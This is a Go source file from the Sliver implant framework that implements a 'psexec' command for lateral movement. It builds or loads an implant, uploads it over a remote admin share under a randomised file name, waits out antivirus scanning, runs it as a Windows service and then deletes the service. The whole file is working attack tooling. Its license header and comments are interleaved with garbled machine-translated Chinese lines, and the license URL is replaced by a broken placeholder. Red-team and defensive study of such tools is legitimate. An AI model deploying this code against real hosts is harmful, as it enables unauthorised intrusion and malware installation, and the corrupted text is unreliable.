package exec

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox
	Copyright (C) 2021 Bishop Fox

	This program is free software: you can redistribute it and/or modify
	This 程序是免费软件：您可以重新分发它 and/or 修改
	it under the terms of the GNU General Public License as published by
	它根据 GNU General Public License 发布的条款
	the Free Software Foundation, either version 3 of the License, or
	Free Software Foundation，License 的版本 3，或
	(at your option) any later version.
	（由您选择）稍后 version.

	This program is distributed in the hope that it will be useful,
	This 程序被分发，希望它有用，
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	但是WITHOUT ANY WARRANTY；甚至没有默示保证
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	MERCHANTABILITY 或 FITNESS FOR A PARTICULAR PURPOSE. See
	GNU General Public License for more details.
	GNU General Public License 更多 details.

	You should have received a copy of the GNU General Public License
	You 应已收到 GNU General Public License 的副本
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
	与此 program. If 不一起，请参见 <__PH0__
*/

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/command/generate"
	"github.com/bishopfox/sliver/client/command/settings"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util"
	"github.com/bishopfox/sliver/util/encoders"
	"github.com/spf13/cobra"
)

// PsExecCmd - psexec command implementation.
// PsExecCmd - psexec 命令 implementation.
func PsExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	hostname := args[0]
	if hostname == "" {
		con.PrintErrorf("You need to provide a target host, see `help psexec` for examples")
		return
	}
	var serviceBinary []byte
	profile, _ := cmd.Flags().GetString("profile")
	serviceName, _ := cmd.Flags().GetString("service-name")
	serviceDesc, _ := cmd.Flags().GetString("service-description")
	binPath, _ := cmd.Flags().GetString("binpath")
	customExe, _ := cmd.Flags().GetString("custom-exe")
	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(binPath), "c:", "C$"))

	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
		con.PrintWarnf("You're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
		con.PrintWarnf("You might want to change that before going further...\n")
		if !settings.IsUserAnAdult(con) {
			return
		}
	}

	if customExe == "" {
		if profile == "" {
			con.PrintErrorf("You need to pass a profile name, see `help psexec` for more info\n")
			return
		}

		// generate sliver
		// 生成 sliver
		generateCtrl := make(chan bool)
		con.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
		profiles, err := con.Rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
		if err != nil {
			con.PrintErrorf("Error: %s\n", err)
			return
		}
		generateCtrl <- true
		<-generateCtrl
		var implantProfile *clientpb.ImplantProfile
		for _, prof := range profiles.Profiles {
			if prof.Name == profile {
				implantProfile = prof
			}
		}
		if implantProfile.GetName() == "" {
			con.PrintErrorf("No profile found for name %s\n", profile)
			return
		}
		serviceBinary, _ = generate.GetSliverBinary(implantProfile, con)
	} else {
		// use a custom exe instead of generating a new Sliver
		// 使用自定义 exe 而不是生成新的 Sliver
		fileBytes, err := os.ReadFile(customExe)
		if err != nil {
			con.PrintErrorf("Error reading custom executable '%s'\n", customExe)
			return
		}
		serviceBinary = fileBytes
	}

	filename := randomFileName()
	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
	uploadGzip, _ := new(encoders.Gzip).Encode(serviceBinary)
	// upload to remote target
	// 上传到远程目标
	uploadCtrl := make(chan bool)
	con.SpinUntil("Uploading service binary ...", uploadCtrl)
	upload, err := con.Rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    filePath,
		Request: con.ActiveTarget.Request(cmd),
	})
	uploadCtrl <- true
	<-uploadCtrl
	if err != nil {
		con.PrintErrorf("Error: %s\n", err)
		return
	}
	con.PrintInfof("Uploaded service binary to %s\n", upload.GetPath())
	con.PrintInfof("Waiting a bit for the file to be analyzed ...\n")
	// Looks like starting the service right away often fails
	// Looks之类的立即启动服务经常会失败
	// because a process is already using the binary.
	// 因为进程已经在使用 binary.
	// I suspect that Defender on my lab is holding access
	// I 怀疑我实验室的 Defender 持有访问权限
	// while scanning, which often resulted in an error.
	// 扫描时，通常会导致 error.
	// Waiting 5 seconds seem to do the trick here.
	// Waiting 5 秒似乎可以解决问题 here.
	time.Sleep(5 * time.Second)
	// start service
	// 启动服务
	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
	serviceCtrl := make(chan bool)
	con.SpinUntil("Starting service ...", serviceCtrl)
	start, err := con.Rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
		BinPath:            binaryPath,
		Hostname:           hostname,
		Request:            con.ActiveTarget.Request(cmd),
		ServiceDescription: serviceDesc,
		ServiceName:        serviceName,
		Arguments:          "",
	})
	serviceCtrl <- true
	<-serviceCtrl
	if err != nil {
		con.PrintErrorf("Error: %v\n", err)
		return
	}
	if start.Response != nil && start.Response.Err != "" {
		con.PrintErrorf("Error: %s", start.Response.Err)
		return
	}
	con.PrintInfof("Successfully started service on %s (%s)\n", hostname, binaryPath)
	removeChan := make(chan bool)
	con.SpinUntil("Removing service ...", removeChan)
	removed, err := con.Rpc.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{
			Hostname:    hostname,
			ServiceName: serviceName,
		},
		Request: con.ActiveTarget.Request(cmd),
	})
	removeChan <- true
	<-removeChan
	if err != nil {
		con.PrintErrorf("Error: %s\n", err)
		return
	}
	if removed.Response != nil && removed.Response.Err != "" {
		con.PrintErrorf("Error: %s\n", removed.Response.Err)
		return
	}
	con.PrintInfof("Successfully removed service %s on %s\n", serviceName, hostname)
}

func randomString() string {
	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
	str := ""
	for index := 0; index < util.Intn(8)+1; index++ {
		str += string(alphanumeric[util.Intn(len(alphanumeric))])
	}
	return str
}

func randomFileName() string {
	noun := randomString()
	noun = strings.ToLower(noun)
	switch util.Intn(3) {
	case 0:
		noun = strings.ToUpper(noun)
	case 1:
		noun = strings.ToTitle(noun)
	}

	separators := []string{"", "", "", "", "", ".", "-", "_", "--", "__"}
	sep := separators[util.Intn(len(separators))]

	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
	prefix := ""
	for index := 0; index < util.Intn(3); index++ {
		prefix += string(alphanumeric[util.Intn(len(alphanumeric))])
	}
	suffix := ""
	for index := 0; index < util.Intn(6)+1; index++ {
		suffix += string(alphanumeric[util.Intn(len(alphanumeric))])
	}

	return fmt.Sprintf("%s%s%s%s%s", prefix, sep, noun, sep, suffix)
}
